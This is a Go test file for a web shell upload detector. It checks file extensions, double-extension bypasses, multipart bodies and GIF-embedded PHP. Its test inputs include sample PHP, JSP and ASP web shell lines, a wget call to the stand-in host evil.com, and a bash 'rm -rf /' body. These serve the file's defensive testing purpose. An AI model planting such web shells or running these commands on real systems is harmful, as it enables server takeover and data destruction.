package webshell

import (
	"bytes"
	"mime/multipart"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/shield/shield/pkg/logger"
)

func newTestDetector(enabled bool) *Detector {
	log, _ := logger.New("warn", "json", "stderr")
	return NewDetector(enabled, "block", log)
}

func TestDangerousExtensionDetection(t *testing.T) {
	tests := []struct {
		ext      string
		dangerous bool
	}{
		{".php", true}, {".php5", true}, {".phtml", true}, {".phar", true},
		{".jsp", true}, {".jspx", true}, {".asp", true}, {".aspx", true},
		{".sh", true}, {".bash", true}, {".py", true}, {".pl", true},
		{".cgi", true}, {".war", true}, {".shtml", true},
		{".txt", false}, {".jpg", false}, {".png", false}, {".pdf", false},
		{".html", false}, {".css", false}, {".js", false}, {"", false},
	}
	for _, tt := range tests {
		if got := IsDangerousExt(tt.ext); got != tt.dangerous {
			t.Errorf("IsDangerousExt(%q) = %v, want %v", tt.ext, got, tt.dangerous)
		}
	}
}

func TestFilenameCheck_DangerousExtension(t *testing.T) {
	d := newTestDetector(true)
	matched, reason := d.checkFilename("shell.php")
	if !matched {
		t.Fatal("expected dangerous filename to be detected")
	}
	if reason != "dangerous_extension:.php" {
		t.Errorf("expected reason dangerous_extension:.php, got %s", reason)
	}
}

func TestFilenameCheck_SafeExtension(t *testing.T) {
	d := newTestDetector(true)
	matched, _ := d.checkFilename("document.pdf")
	if matched {
		t.Fatal("expected safe filename to pass")
	}
}

func TestFilenameCheck_DoubleExtensionBypass(t *testing.T) {
	d := newTestDetector(true)
	tests := []string{"shell.php.jpg", "backdoor.jsp.png", "cmd.sh.txt"}
	for _, fname := range tests {
		matched, reason := d.checkFilename(fname)
		if !matched {
			t.Errorf("%q should be detected as double extension bypass", fname)
		}
		if reason != "double_extension_bypass" {
			t.Errorf("%q: expected double_extension_bypass, got %s", fname, reason)
		}
	}
}

func TestContentCheck_PHPDangerousFunctions(t *testing.T) {
	d := newTestDetector(true)
	payloads := []string{
		`<?php system($_GET['cmd']); ?>`,
		`<?php eval(base64_decode($_POST['x'])); ?>`,
		`<?php passthru($cmd); ?>`,
		`<?php shell_exec("wget http://evil.com/shell.txt"); ?>`,
		`<?php exec("id"); ?>`,
		`<?php proc_open($cmd, $desc, $pipes); ?>`,
		`<?php popen("ls -la", "r"); ?>`,
	}
	for _, payload := range payloads {
		matched, _ := d.checkContent(payload)
		if !matched {
			t.Errorf("expected content to be detected: %s", payload)
		}
	}
}

func TestContentCheck_JSPDangerousPatterns(t *testing.T) {
	d := newTestDetector(true)
	payloads := []string{
		`<% Runtime.getRuntime().exec("cmd"); %>`,
		`<% ProcessBuilder pb = new ProcessBuilder("cmd"); %>`,
		`<% String cmd = request.getParameter("c"); %>`,
	}
	for _, payload := range payloads {
		matched, _ := d.checkContent(payload)
		if !matched {
			t.Errorf("expected JSP content to be detected: %s", payload)
		}
	}
}

func TestContentCheck_ASPDangerousPatterns(t *testing.T) {
	d := newTestDetector(true)
	payloads := []string{
		`<% Server.CreateObject("WScript.Shell") %>`,
		`<% Set fso = Server.CreateObject("Scripting.FileSystemObject") %>`,
	}
	for _, payload := range payloads {
		matched, _ := d.checkContent(payload)
		if !matched {
			t.Errorf("expected ASP content to be detected: %s", payload)
		}
	}
}

func TestContentCheck_ObfuscatedPayloads(t *testing.T) {
	d := newTestDetector(true)
	// The regex patterns match the literal string "\x65\x76\x61\x6c" NOT the
	// decoded bytes "eval". Send the literal backslash-escaped hex strings.
	payloads := []string{
		`\x65\x76\x61\x6c`,   // literal string "\x65\x76\x61\x6c" (hex-encoded "eval")
		`\x73\x79\x73\x74\x65\x6d`, // literal string for hex-encoded "system"
	}
	for _, payload := range payloads {
		matched, _ := d.checkContent(payload)
		if !matched {
			t.Errorf("expected obfuscated payload to be detected: %s", payload)
		}
	}
}

func TestContentCheck_SSIInjection(t *testing.T) {
	d := newTestDetector(true)
	payload := `<!--#exec cmd="id" -->`
	matched, _ := d.checkContent(payload)
	if !matched {
		t.Fatal("expected SSI injection to be detected")
	}
}

func TestContentCheck_BenignContent(t *testing.T) {
	d := newTestDetector(true)
	benign := []string{
		"Hello, World!",
		`{"key": "value"}`,
		"normal text content",
		"print('hello')", // Python print is not dangerous exec
	}
	for _, content := range benign {
		matched, _ := d.checkContent(content)
		if matched {
			t.Errorf("benign content should not be detected: %s", content)
		}
	}
}

func TestContentCheck_ImageHorse(t *testing.T) {
	d := newTestDetector(true)
	// GIF header with embedded PHP tags but no dangerous functions.
	// The image_horse check is a fallback — it only fires when no regex
	// pattern already matched. Use PHP tags WITHOUT dangerous function calls
	// so the regex patterns pass over it and image_horse catches it.
	payload := "GIF89a\x00\x00\x00<?php echo 'hello'; ?>"
	matched, reason := d.checkContent(payload)
	if !matched {
		t.Fatal("expected image horse to be detected")
	}
	if reason != "image_horse" {
		t.Errorf("expected image_horse, got %s", reason)
	}
}

func TestInspectRequest_Disabled(t *testing.T) {
	d := newTestDetector(false)
	req := httptest.NewRequest("POST", "/upload", bytes.NewBufferString("<?php shell_exec('id'); ?>"))
	req.Header.Set("Content-Type", "application/octet-stream")
	matched, _ := d.InspectRequest(req)
	if matched {
		t.Fatal("expected no detection when disabled")
	}
}

func TestInspectRequest_XFilenameHeader(t *testing.T) {
	d := newTestDetector(true)
	req := httptest.NewRequest("POST", "/upload", nil)
	req.Header.Set("X-Filename", "shell.php")
	matched, reason := d.InspectRequest(req)
	if !matched {
		t.Fatal("expected X-Filename header to be detected")
	}
	if reason != "dangerous_extension:.php" {
		t.Errorf("expected dangerous_extension:.php, got %s", reason)
	}
}

func TestInspectRequest_SafeXFilename(t *testing.T) {
	d := newTestDetector(true)
	req := httptest.NewRequest("POST", "/upload", nil)
	req.Header.Set("X-Filename", "document.pdf")
	matched, _ := d.InspectRequest(req)
	if matched {
		t.Fatal("expected safe X-Filename to pass")
	}
}

func TestInspectRequest_MultipartUpload(t *testing.T) {
	d := newTestDetector(true)

	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", "shell.php")
	part.Write([]byte("<?php system($_GET['cmd']); ?>"))
	writer.Close()

	req := httptest.NewRequest("POST", "/upload", body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	matched, _ := d.InspectRequest(req)
	if !matched {
		t.Fatal("expected multipart upload with PHP file to be detected")
	}
}

func TestInspectRequest_MultipartImageFile(t *testing.T) {
	d := newTestDetector(true)

	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)
	part, _ := writer.CreateFormFile("file", "image.jpg")
	part.Write([]byte("GIF89a\x00\x00\x00<?php system($_GET['cmd']); ?>"))
	writer.Close()

	req := httptest.NewRequest("POST", "/upload", body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	matched, _ := d.InspectRequest(req)
	if !matched {
		t.Fatal("expected image horse in multipart upload to be detected")
	}
}

func TestInspectRequest_RawBody(t *testing.T) {
	d := newTestDetector(true)
	req := httptest.NewRequest("POST", "/upload", bytes.NewBufferString(`<?php eval($_POST['c']); ?>`))
	req.Header.Set("Content-Type", "application/octet-stream")
	matched, _ := d.InspectRequest(req)
	if !matched {
		t.Fatal("expected raw body web shell to be detected")
	}
}

func TestInspectRequestWithBody_PreRead(t *testing.T) {
	d := newTestDetector(true)
	req := httptest.NewRequest("POST", "/upload", nil)
	body := []byte(`<?php system($_GET['cmd']); ?>`)
	matched, _ := d.InspectRequestWithBody(req, body)
	if !matched {
		t.Fatal("expected pre-read body content to be detected")
	}
}

func TestInspectRequestWithBody_XFilenameWithBody(t *testing.T) {
	d := newTestDetector(true)
	req := httptest.NewRequest("POST", "/upload", nil)
	req.Header.Set("X-Filename", "cmd.sh")
	body := []byte("#!/bin/bash\nrm -rf /\n")
	matched, _ := d.InspectRequestWithBody(req, body)
	if !matched {
		t.Fatal("expected X-Filename .sh with body to be detected")
	}
}

func TestInspectRequestWithBody_XFilenameSafeExtDangerousContent(t *testing.T) {
	d := newTestDetector(true)
	req := httptest.NewRequest("POST", "/upload", nil)
	req.Header.Set("X-Filename", "notes.txt")
	body := []byte(`<?php system($_GET['cmd']); ?>`)
	matched, _ := d.InspectRequestWithBody(req, body)
	if !matched {
		t.Fatal("expected dangerous body content to be detected even with safe extension")
	}
}

func TestInspectRequestWithBody_MultipartBody(t *testing.T) {
	d := newTestDetector(true)
	req := httptest.NewRequest("POST", "/upload", nil)
	req.Header.Set("Content-Type", `multipart/form-data; boundary="----WebKitFormBoundary"`)
	body := []byte("------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n\r\n<?php system('id'); ?>\r\n------WebKitFormBoundary--\r\n")
	matched, _ := d.InspectRequestWithBody(req, body)
	if !matched {
		t.Fatal("expected multipart body web shell to be detected")
	}
}

func TestInspectRequestWithBody_Disabled(t *testing.T) {
	d := newTestDetector(false)
	req := httptest.NewRequest("POST", "/upload", nil)
	body := []byte(`<?php system($_GET['cmd']); ?>`)
	matched, _ := d.InspectRequestWithBody(req, body)
	if matched {
		t.Fatal("expected no detection when disabled")
	}
}

func TestExtractFilenameFromMultipart(t *testing.T) {
	body := new(bytes.Buffer)
	writer := multipart.NewWriter(body)
	part1, _ := writer.CreateFormFile("file1", "document.pdf")
	part1.Write([]byte("test"))
	part2, _ := writer.CreateFormFile("file2", "image.jpg")
	part2.Write([]byte("test"))
	writer.Close()

	req := httptest.NewRequest("POST", "/upload", body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	filenames := ExtractFilenameFromMultipart(req)
	if len(filenames) != 2 {
		t.Fatalf("expected 2 filenames, got %d", len(filenames))
	}
}

func TestReloadPatterns(t *testing.T) {
	d := newTestDetector(true)
	pats := []string{`(?i)custom_pattern_test`}
	d.ReloadPatterns(pats)
	matched, _ := d.checkContent("CUSTOM_PATTERN_TEST")
	if !matched {
		t.Fatal("expected custom pattern to match after ReloadPatterns")
	}
}

func TestReloadPatterns_InvalidPatternIgnored(t *testing.T) {
	d := newTestDetector(true)
	pats := []string{`[invalid\\`, `(?i)valid`}
	d.ReloadPatterns(pats)
	matched, _ := d.checkContent("VALID")
	if !matched {
		t.Fatal("expected valid pattern to still work after reload with one invalid pattern")
	}
}

func TestCheckMultipartBody_NoBoundary(t *testing.T) {
	d := newTestDetector(true)
	matched, _ := d.checkMultipartBody([]byte("no multipart here"), "")
	if matched {
		t.Fatal("expected false with no boundary")
	}
}

func TestCheckMultipartBody_DoubleExtensionInMultipart(t *testing.T) {
	d := newTestDetector(true)
	body := []byte("--boundary123\r\nContent-Disposition: form-data; name=\"file\"; filename=\"evil.php.jpg\"\r\n\r\ncontent\r\n--boundary123--\r\n")
	matched, reason := d.checkMultipartBody(body, "boundary123")
	if !matched {
		t.Fatal("expected double extension bypass to be detected in multipart body")
	}
	if reason != "double_extension_bypass" {
		t.Errorf("expected double_extension_bypass, got %s", reason)
	}
}

func TestCheckMultipartBody_DangerousContent(t *testing.T) {
	d := newTestDetector(true)
	body := []byte("--boundary123\r\nContent-Disposition: form-data; name=\"file\"; filename=\"document.txt\"\r\n\r\n<?php system('id'); ?>\r\n--boundary123--\r\n")
	matched, _ := d.checkMultipartBody(body, "boundary123")
	if !matched {
		t.Fatal("expected dangerous content in multipart to be detected")
	}
}

func TestAllDangerousExtensions(t *testing.T) {
	for ext := range dangerousExts {
		if !IsDangerousExt(ext) {
			t.Errorf("IsDangerousExt(%q) should be true", ext)
		}
		// Test case insensitivity
		if !IsDangerousExt(strings.ToUpper(ext)) {
			t.Errorf("IsDangerousExt(%q) should be true (case insensitive)", strings.ToUpper(ext))
		}
	}
}
